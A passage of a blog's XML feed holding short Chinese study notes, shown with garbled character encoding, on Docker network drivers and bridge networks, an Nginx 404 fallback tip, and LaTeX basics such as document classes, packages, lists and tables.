    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/docker/docker-swarm.html">èœé¸Ÿ</a></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-docs-ä¸­çš„-Networking-overview-éƒ¨åˆ†</title>
    <link href="/2022/10/07/Docker-docs-%E4%B8%AD%E7%9A%84-Networking-overview-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/07/Docker-docs-%E4%B8%AD%E7%9A%84-Networking-overview-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Network-drivers"><a href="#Network-drivers" class="headerlink" title="Network drivers"></a>Network drivers</h1><p>æœ‰è¿™æ ·å‡ ç§ç±»å‹:</p><ul><li><code>bridge</code></li><li><code>host</code></li><li><code>overlay</code></li><li><code>ipvlan</code></li><li><code>macvlan</code></li><li><code>none</code></li><li>Network Plugins</li></ul><h2 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h2><p><a href="https://docs.docker.com/network/bridge/">å®˜æ–¹æ–‡æ¡£</a><br><code>bridge</code>, è¿™æ˜¯é»˜è®¤çš„ Network driver, è¿™ä¸ªç”¨äºä½ æœ‰å‡ ä¸ªç‹¬ç«‹çš„å®¹å™¨, ç„¶åä½ æƒ³è®©å®ƒä»¬è¿æ¥åˆ°ä¸€èµ·.</p><p>ä¸€ä¸ª bridge å¯ä»¥æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨å®¿ä¸»æœºå†…æ ¸ä¹‹ä¸Šçš„ç¡¬ä»¶è®¾å¤‡æˆ–è€…è½¯ä»¶è®¾å¤‡.</p><p>Docker ä½¿ç”¨çš„æ˜¯è½¯ä»¶ bridge, å…è®¸ containers è¿æ¥åˆ°åŒä¸€ä¸ª bridge å¹¶èƒ½å¤Ÿé€šä¿¡, æ²¡æœ‰è¿æ¥åˆ°è¿™ä¸ª bridge çš„ containers ä¸èƒ½ä¸ä¹‹é€šä¿¡.</p><p>ä¹Ÿå°±æ˜¯ä½äºåŒä¸€ä¸ªç½‘æ®µçš„å¯ä»¥é€šä¿¡.</p><p>è¿™åªèƒ½ç”¨äº containers è·‘åœ¨åŒä¸€å°ä¸»æœºä¸Š.</p><p>ç”¨æˆ·å®šä¹‰çš„ bridge ä¼˜å…ˆçº§æ¯”é»˜è®¤å®šä¹‰çš„é«˜.</p><h3 id="é…ç½®é»˜è®¤çš„-bridge-network"><a href="#é…ç½®é»˜è®¤çš„-bridge-network" class="headerlink" title="é…ç½®é»˜è®¤çš„ bridge network"></a>é…ç½®é»˜è®¤çš„ bridge network</h3><p>å¯ä»¥åœ¨ <code>daemon.json</code> è¿™ä¸ªæ–‡ä»¶ä¸­å†™ç›¸åº”é…ç½®. è·¯å¾„ä¸º <code>/etc/docker/daemon.json</code>, å¦‚å®˜æ–¹ç»™å‡ºçš„ä¾‹å­:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;bip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.1.1/24&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;fixed-cidr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.1.0/25&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;fixed-cidr-v6&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2001:db8::/64&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mtu&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1500</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;default-gateway&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;192.168.1.254&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;default-gateway-v6&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2001:db8:abcd::89&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;10.20.1.2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;10.20.1.3&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p><a href="https://docs.docker.com/network/host/">å®˜æ–¹æ–‡æ¡£</a><br>ç”¨è¿™ä¸ª network å¯ä»¥å»é™¤å„ä¸ªå®¹å™¨ä»¥åŠå®¿ä¸»æœºä¹‹é—´çš„éš”ç¦»æ€§, ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œ. </p><p>å®¹å™¨ä¸ä¼šè¢«åˆ†é… IP åœ°å€.</p><p>æ¯”å¦‚, å¦‚æœè¿™ä¸ªå®¹å™¨ä½¿ç”¨äº† 80 ç«¯å£, åœ¨ä½¿ç”¨ <code>host</code> ç½‘ç»œæ—¶, ä½ å¯ä»¥ç”¨ç´ ä¸»æœºçš„ 80 ç«¯å£è®¿é—®è¿™ä¸ªæœåŠ¡. (ä¹Ÿå°±æ˜¯è¯´ port-mapping ä¼šå¤±æ•ˆ).</p><p>è¿™ä¸ª <code>host</code> é€‰é¡¹åªæœ‰åœ¨ Linux ä¸»æœºä¸Šæ‰èƒ½ä½¿ç”¨.</p><h2 id="overlay"><a href="#overlay" class="headerlink" title="overlay"></a>overlay</h2><p><a href="https://docs.docker.com/network/overlay/">å®˜æ–¹æ–‡æ¡£</a><br>ä¼¼ä¹å’Œ Swarm ç›¸å…³.</p><h2 id="ipvlan"><a href="#ipvlan" class="headerlink" title="ipvlan"></a>ipvlan</h2><p><a href="https://docs.docker.com/network/ipvlan/">å®˜æ–¹æ–‡æ¡£</a><br>è®©ç”¨æˆ·å®Œå…¨æŒæ§ ipv4 å’Œ ipv6.</p><p>æ–‡æ¡£æœ‰ç‚¹é•¿.</p><h2 id="macvlan"><a href="#macvlan" class="headerlink" title="macvlan"></a>macvlan</h2><p><a href="https://docs.docker.com/network/macvlan/">å®˜æ–¹æ–‡æ¡£</a><br>å…¶å…è®¸ä½ ç»™å®¹å™¨åˆ†é…ä¸€ä¸ª MAC åœ°å€.</p><h2 id="none"><a href="#none" class="headerlink" title="none"></a>none</h2><p><a href="https://docs.docker.com/network/">å®˜æ–¹æ–‡æ¡£</a></p><p>å¯¹äºè¿™ä¸ªå®¹å™¨, ç¦æ­¢æ‰€æœ‰çš„ network.</p><p>none ä¸èƒ½å¯¹ swarm ä½¿ç”¨.</p><h2 id="Network-Plugins"><a href="#Network-Plugins" class="headerlink" title="Network Plugins"></a>Network Plugins</h2><p>ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ç½‘ç»œæ’ä»¶.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç»™-Docker-å®¹å™¨ç»‘å®šåŸŸå</title>
    <link href="/2022/10/07/%E7%BB%99-Docker-%E5%AE%B9%E5%99%A8%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/"/>
    <url>/2022/10/07/%E7%BB%99-Docker-%E5%AE%B9%E5%99%A8%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-å¤„ç†å‰©ä½™æ‰€æœ‰é¡µé¢çš„æ€è·¯</title>
    <link href="/2022/10/07/Nginx-%E5%A4%84%E7%90%86%E5%89%A9%E4%BD%99%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/10/07/Nginx-%E5%A4%84%E7%90%86%E5%89%A9%E4%BD%99%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>å‰©ä½™æ‰€æœ‰é¡µé¢ä¼šé€ æˆ <code>404</code> é”™è¯¯, å› æ­¤é€šè¿‡ <code>error_page 404</code> è®¾ç½®ä¸€ä¸‹, å°±å¯ä»¥è®©å‰©ä¸‹æ‰€æœ‰çš„ url å¯¼å‘è¿™ä¸ªé¡µé¢.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-ä¸­çš„-bridge-ç½‘ç»œ</title>
    <link href="/2022/10/07/Docker-%E4%B8%AD%E7%9A%84-bridge-%E7%BD%91%E7%BB%9C/"/>
    <url>/2022/10/07/Docker-%E4%B8%AD%E7%9A%84-bridge-%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.qb5200.com/article/320600.html">å‚è€ƒ</a></p><h1 id="bridge-çš„ä½œç”¨"><a href="#bridge-çš„ä½œç”¨" class="headerlink" title="bridge çš„ä½œç”¨"></a>bridge çš„ä½œç”¨</h1><p>å°±æ˜¯è¿é€šå‡ ä¸ªå®¹å™¨, è¿™äº›å®¹å™¨ä¼šè‡ªåŠ¨ç›¸äº’æš´éœ²æ‰€æœ‰ç«¯å£, è€Œä¸”ä¸ä¼šæš´éœ²ç»™å¤–éƒ¨.</p><p>åœ¨ç”¨æˆ·è‡ªå®šä¹‰çš„ç½‘æ¡¥ä¸­, å®¹å™¨ä¹‹é—´å¯ä»¥ç›´æ¥é€šè¿‡å®¹å™¨åæˆ–åˆ«åè¿›è¡Œè®¿é—®.</p><p>å¦‚ä¸€ä¸ªå®¹å™¨å« test1, å¦ä¸€ä¸ªå« test2, è¿™ä¸¤ä¸ªè¿ä¸ŠåŒä¸€ä¸ª bridge, åœ¨ test1 ä¸­å¯ä»¥æ‰§è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ping test2 <br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ ping é€š.</p><p>åˆ©ç”¨ <code>link</code> é”®å€¼å¯¹ (æ•°ç»„) å¯ä»¥ä½¿ç”¨åˆ«å:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  web:</span><br><span class="hljs-symbol">    build:</span> .<br><span class="hljs-symbol">    links:</span><br>      - <span class="hljs-string">&quot;db:database&quot;</span><br><span class="hljs-symbol">  db:</span><br><span class="hljs-symbol">    image:</span> postgres<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>database</code> å°±æ˜¯åˆ«å.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTeX-å‚è€ƒåšæ–‡</title>
    <link href="/2022/10/07/LaTeX-%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87/"/>
    <url>/2022/10/07/LaTeX-%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://zhuanlan.zhihu.com/p/456055339?utm_medium=social&utm_oi=1215946114580484096&utm_psn=1561623486828875776&utm_source=qq">å‚è€ƒ1</a></h1><h2 id="è®¾ç½®æ–‡ç« ç±»å‹ä»¥åŠæ–‡ç« çš„åŸºæœ¬å‚æ•°"><a href="#è®¾ç½®æ–‡ç« ç±»å‹ä»¥åŠæ–‡ç« çš„åŸºæœ¬å‚æ•°" class="headerlink" title="è®¾ç½®æ–‡ç« ç±»å‹ä»¥åŠæ–‡ç« çš„åŸºæœ¬å‚æ•°"></a>è®¾ç½®æ–‡ç« ç±»å‹ä»¥åŠæ–‡ç« çš„åŸºæœ¬å‚æ•°</h2><p>åˆ©ç”¨ <code>\documentclass</code>:</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, a4paper, oneside]&#123;ctexart&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ document ç¯å¢ƒå¤–çš„éƒ¨åˆ†ä¸ä¼šå‡ºç°åœ¨ç»“æœä¸­:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\documentclass[12pt, a4paper, oneside]</span><span class="hljs-template-variable">&#123;ctexart&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">\begin</span><span class="hljs-template-variable">&#123;document&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">hello world</span><br><span class="language-xml"></span><br><span class="language-xml">\end</span><span class="hljs-template-variable">&#123;document&#125;</span><br></code></pre></td></tr></table></figure><p><code>[]</code> ä¸­çš„å†…å®¹ä¸ºå‚æ•°, <code>&#123;&#125;</code> ä¸­çš„å†…å®¹ä¸ºç±»å‹.</p><h2 id="ä»€ä¹ˆæ˜¯å¯¼è¨€åŒºåŠå…¶ä½œç”¨"><a href="#ä»€ä¹ˆæ˜¯å¯¼è¨€åŒºåŠå…¶ä½œç”¨" class="headerlink" title="ä»€ä¹ˆæ˜¯å¯¼è¨€åŒºåŠå…¶ä½œç”¨"></a>ä»€ä¹ˆæ˜¯å¯¼è¨€åŒºåŠå…¶ä½œç”¨</h2><p>åœ¨ document ç¯å¢ƒä¸­çš„ <code>\begin&#123;document&#125;</code> ä¹‹å‰çš„éƒ¨åˆ†å°±æ˜¯å¯¼è¨€åŒº.</p><p>å¯¼è¨€åŒºç”¨æ¥åŠ è½½å®åŒ… (å¯ä»¥ç†è§£ä¸ºæ¨¡å—æˆ–æ’ä»¶).</p><p>ç”¨ <code>\usepackage</code> æ¥åŠ è½½:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\usepackage[<span class="hljs-attribute">bookmarks</span>=ture, colorlinks, <span class="hljs-attribute">citecolor</span>=blue, <span class="hljs-attribute">linkcolor</span>=black]&#123;hyperref&#125;<br></code></pre></td></tr></table></figure><p><code>[]</code> é‡Œçš„åŒæ ·æ˜¯åŸºæœ¬å‚æ•°, <code>&#123;&#125;</code> å†…çš„æ˜¯å®åŒ…å.</p><p>å¯ä»¥å¤šæ¬¡ä½¿ç”¨ <code>\usepackage</code> æ¥åŠ è½½:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\documentclass[12pt, a4paper, oneside]&#123;ctexart&#125;<br>\usepackage&#123;amsmath, amsthm, amssymb, graphicx&#125;<br>\usepackage[<span class="hljs-attribute">bookmarks</span>=<span class="hljs-literal">true</span>, colorlinks, <span class="hljs-attribute">citecolor</span>=blue, <span class="hljs-attribute">linkcolor</span>=black]&#123;hyperref&#125;<br></code></pre></td></tr></table></figure><h3 id="è®¾ç½®æ ‡é¢˜-ä½œè€…ç­‰"><a href="#è®¾ç½®æ ‡é¢˜-ä½œè€…ç­‰" class="headerlink" title="è®¾ç½®æ ‡é¢˜, ä½œè€…ç­‰"></a>è®¾ç½®æ ‡é¢˜, ä½œè€…ç­‰</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\title&#123;æˆ‘çš„ç¬¬ä¸€ä¸ª\LaTeX</span> æ–‡æ¡£&#125;<br><span class="hljs-string">\author&#123;Dylaaan&#125;</span><br><span class="hljs-string">\date&#123;\today&#125;</span><br><br><span class="hljs-string">\begin&#123;document&#125;</span><br><br><span class="hljs-string">\maketitle</span><br><br>è¿™é‡Œæ˜¯æ­£æ–‡. <br><br><span class="hljs-string">\end&#123;document&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="æ­£æ–‡éƒ¨åˆ†"><a href="#æ­£æ–‡éƒ¨åˆ†" class="headerlink" title="æ­£æ–‡éƒ¨åˆ†"></a>æ­£æ–‡éƒ¨åˆ†</h2><p>è¦åœ¨æ–‡æ¡£ä¸­æ˜¾ç¤ºæ ‡é¢˜, éœ€è¦åœ¨ document ç¯å¢ƒä¸­ä½¿ç”¨ <code>\maketitle</code>.</p><p>åœ¨ LaTeX ä¸­, å¦èµ·ä¸€æ®µçš„æ–¹å¼æ˜¯ä½¿ç”¨ä¸€è¡Œé—´éš”.</p><p>å¯ä»¥ç”¨ <code>\newpage</code> å¦èµ·ä¸€é¡µ.</p><h1 id="å‡ ä¸ªæ‰‹å†Œ"><a href="#å‡ ä¸ªæ‰‹å†Œ" class="headerlink" title="å‡ ä¸ªæ‰‹å†Œ"></a>å‡ ä¸ªæ‰‹å†Œ</h1><p><a href="https://www.cnblogs.com/1024th/p/11623258.html">å‚è€ƒ1</a><br><a href="https://blog.csdn.net/ViatorSun/article/details/82826664">å‚è€ƒ2</a><br><a href="http://mohu.org/info/symbols/symbols.htm">å‚è€ƒ3</a></p><h1 id="æŠ€å·§ç§¯ç´¯"><a href="#æŠ€å·§ç§¯ç´¯" class="headerlink" title="æŠ€å·§ç§¯ç´¯"></a>æŠ€å·§ç§¯ç´¯</h1><p>å†™è´Ÿæ•°æ¬¡å¹‚, éœ€è¦ä½¿ç”¨å¤§æ‹¬å· <code>&#123;&#125;</code>, <code>$10^&#123;-10&#125;$</code>.</p><h2 id="ä¹˜æ³•ç¬¦å·"><a href="#ä¹˜æ³•ç¬¦å·" class="headerlink" title="ä¹˜æ³•ç¬¦å·"></a>ä¹˜æ³•ç¬¦å·</h2><p><mark>ä¹˜æ³•</mark> æ˜¯ <code>\times</code> è¿™æ˜¯ <code>x</code> ä¹˜.</p><p>ç‚¹ä¹˜ä¸º <code>\cdot</code></p><h2 id="è¾“å‡ºæ— ç©·ç¬¦å·"><a href="#è¾“å‡ºæ— ç©·ç¬¦å·" class="headerlink" title="è¾“å‡ºæ— ç©·ç¬¦å·"></a>è¾“å‡ºæ— ç©·ç¬¦å·</h2><p>æ­£æ— ç©·ä¸º <code>+\infty</code></p><p>è´Ÿæ— ç©·ä¸º <code>-\infty</code></p><h2 id="åœ¨è¾“å‡ºä¸€é•¿ä¸²å…¬å¼æ—¶æ¢è¡Œ"><a href="#åœ¨è¾“å‡ºä¸€é•¿ä¸²å…¬å¼æ—¶æ¢è¡Œ" class="headerlink" title="åœ¨è¾“å‡ºä¸€é•¿ä¸²å…¬å¼æ—¶æ¢è¡Œ"></a>åœ¨è¾“å‡ºä¸€é•¿ä¸²å…¬å¼æ—¶æ¢è¡Œ</h2><p>ä½¿ç”¨ <code>\newline</code></p><h2 id="è¾“å‡ºæ­£è´Ÿå·"><a href="#è¾“å‡ºæ­£è´Ÿå·" class="headerlink" title="è¾“å‡ºæ­£è´Ÿå·"></a>è¾“å‡ºæ­£è´Ÿå·</h2><p><code>\pm</code> ä¹Ÿå°±æ˜¯ plug minus.</p><h2 id="æ˜¾ç¤ºç™¾åˆ†å·"><a href="#æ˜¾ç¤ºç™¾åˆ†å·" class="headerlink" title="æ˜¾ç¤ºç™¾åˆ†å·"></a>æ˜¾ç¤ºç™¾åˆ†å·</h2><p>éœ€è¦ç”¨ <code>\</code> è½¬ä¹‰: <code>\%</code>.</p><h2 id="æ˜¾ç¤ºæ‘„æ°åº¦"><a href="#æ˜¾ç¤ºæ‘„æ°åº¦" class="headerlink" title="æ˜¾ç¤ºæ‘„æ°åº¦"></a>æ˜¾ç¤ºæ‘„æ°åº¦</h2><p><code>$^\circ$C</code></p><h2 id="æ­£æ¯”ç¬¦å·"><a href="#æ­£æ¯”ç¬¦å·" class="headerlink" title="æ­£æ¯”ç¬¦å·"></a>æ­£æ¯”ç¬¦å·</h2><p><code>\propto</code></p><h1 id="å‚è€ƒ-B-ç«™"><a href="#å‚è€ƒ-B-ç«™" class="headerlink" title="å‚è€ƒ B ç«™"></a><a href="https://b23.tv/fGEBYVT">å‚è€ƒ B ç«™</a></h1><h2 id="ç²—ä½“-æ–œä½“-ä¸‹åˆ’çº¿"><a href="#ç²—ä½“-æ–œä½“-ä¸‹åˆ’çº¿" class="headerlink" title="ç²—ä½“, æ–œä½“, ä¸‹åˆ’çº¿"></a>ç²—ä½“, æ–œä½“, ä¸‹åˆ’çº¿</h2><p><code>\textbf&#123;&#125;</code>, bf æ˜¯ bold font.</p><p><code>\textit&#123;&#125;</code>, it æ˜¯ italic.</p><p><code>\underline&#123;&#125;</code>.</p><p><code>\overline&#123;&#125;</code></p><h2 id="æ®µè½ç« èŠ‚"><a href="#æ®µè½ç« èŠ‚" class="headerlink" title="æ®µè½ç« èŠ‚"></a>æ®µè½ç« èŠ‚</h2><p>ç»“æ„ä¸º: <code>\part&#123;&#125;</code> &#x3D;&gt; <code>\chapter&#123;&#125;</code> &#x3D;&gt; <code>\section&#123;&#125;</code> &#x3D;&gt; <code>\subsection&#123;&#125;</code> &#x3D;&gt; <code>\subsubsection&#123;&#125;</code></p><h2 id="æ·»åŠ å›¾ç‰‡"><a href="#æ·»åŠ å›¾ç‰‡" class="headerlink" title="æ·»åŠ å›¾ç‰‡"></a>æ·»åŠ å›¾ç‰‡</h2><p><code>graphicx</code> è¿™ä¸ªåŒ….</p><p>ä½¿ç”¨ <code>\includegraphics&#123;&#125;</code> æ·»åŠ å›¾ç‰‡, å¯ä»¥ä¸åŠ æ‰©å±•å.</p><p>å¯è°ƒæ•´å›¾ç‰‡å®½åº¦å¦‚:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\includegraphics</span>[width=0.5<span class="hljs-keyword">\textwidth</span>]&#123;somegraph&#125;<br></code></pre></td></tr></table></figure><p>è¯•éªŒåæ²¡æ•ˆæœ.</p><p>ç»™å›¾ç‰‡æ·»åŠ æ ‡é¢˜, å¯ä»¥å°†å…¶åµŒå¥—åœ¨ <code>figure</code> ç¯å¢ƒä¸­:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">\begin&#123;<span class="hljs-selector-tag">figure</span>&#125;<br>\includegraphics<span class="hljs-selector-attr">[width=0.5\textwidth]</span>&#123;somegraph&#125;<br>\<span class="hljs-selector-tag">caption</span>&#123;title&#125;<br>\end&#123;<span class="hljs-selector-tag">figure</span>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨  <code>\caption&#123;&#125;</code> å‘½ä»¤æŒ‡å®šæ ‡é¢˜.</p><p>å¯ä»¥ç”¨ <code>\centering</code> å‘½ä»¤å°†å›¾ç‰‡å±…ä¸­æ˜¾ç¤º.</p><h2 id="åˆ—è¡¨çš„åˆ›å»º"><a href="#åˆ—è¡¨çš„åˆ›å»º" class="headerlink" title="åˆ—è¡¨çš„åˆ›å»º"></a>åˆ—è¡¨çš„åˆ›å»º</h2><p>å…ˆè¿›å…¥åˆ—è¡¨ç¯å¢ƒ, ç¯å¢ƒç±»ä¼¼äºæ™®é€šç¼–ç¨‹è¯­è¨€çš„ä½œç”¨åŸŸ.</p><p>ä½äºåŒä¸€ä¸ªç¯å¢ƒä¸­çš„å†…å®¹å°†ä¼šå…±äº«ç›¸åŒçš„æ–‡å­—æ ¼å¼.</p><p>ç”¨ <code>\begin&#123;itemize&#125;</code> åˆ›å»ºæ— åºåˆ—è¡¨. åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½ä»¥ <code>\item</code> å¼€å¤´.</p><p>å¦‚:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">\begin&#123;itemize&#125;<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> one<br>\<span class="hljs-keyword">end</span>&#123;itemize&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ <code>enumerate</code> ç¯å¢ƒåˆ›å»ºæœ‰åºåˆ—è¡¨ç¯å¢ƒ. å¦‚:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">\begin&#123;enumerate&#125;<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> one<br>    \<span class="hljs-built_in">item</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> one<br>\<span class="hljs-keyword">end</span>&#123;enumerate&#125;<br></code></pre></td></tr></table></figure><p>å…ƒç´ åŒæ ·ç”¨ <code>\item</code> å¼€å¤´.</p><h2 id="æ•°å­¦å…¬å¼"><a href="#æ•°å­¦å…¬å¼" class="headerlink" title="æ•°å­¦å…¬å¼"></a>æ•°å­¦å…¬å¼</h2><p>è¡Œå†…ç”¨ <code>$$</code>.</p><p>å•ç‹¬ä¸€è¡Œç”¨ <code>equation</code> ç¯å¢ƒ:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">\<span class="hljs-keyword">begin</span>&#123;equation&#125;<br><br>\<span class="hljs-keyword">end</span>&#123;equation&#125;<br></code></pre></td></tr></table></figure><p><code>equation</code> ç¯å¢ƒä¼šåœ¨å…¬å¼å³æ–¹æ‰“å°ç¼–å·.</p><p>ä½¿ç”¨ <code>displaymath</code> ç¯å¢ƒ, å¯ä»¥ç®€å†™ä¸º <code>\[</code>:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\[</span><br><br><span class="hljs-string">\]</span><br></code></pre></td></tr></table></figure><h2 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h2><p>ä½¿ç”¨ <code>tabular</code> ç¯å¢ƒ, ä¼ å…¥å‚æ•°è¡¨ç¤ºå°ºå¯¸:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;tabular&#125;&#123;<span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span>&#125;<br><br>\<span class="hljs-keyword">end</span>&#123;tabular&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;c c c&#125;</code> çš„å«ä¹‰ä¸º, æœ‰ä¸‰åˆ—, æ¯ä¸€åˆ—çš„å†…å®¹éƒ½å±…ä¸­å¯¹é½, <code>c</code> æ˜¯ centering çš„æ„æ€. å¯ä»¥æ›¿æ¢ <code>c</code> ä¸º <code>l</code> , <code>r</code>.</p><p>æ¯ä¸€åˆ—ç”¨ <code>&amp;</code> åˆ†å‰², æ¯ä¸€è¡Œç”¨ <code>\\</code> åˆ†å‰²:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;tabular&#125;&#123;<span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span> <span class="hljs-keyword">c</span>&#125;<br><span class="hljs-keyword">one</span>   &amp; two   &amp; three \\<br>four  &amp; five  &amp; six \\<br>seven &amp; eight &amp; nine<br>\<span class="hljs-keyword">end</span>&#123;tabular&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå¸¦ç«–ç›´çº¿çš„è¾¹æ¡†:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 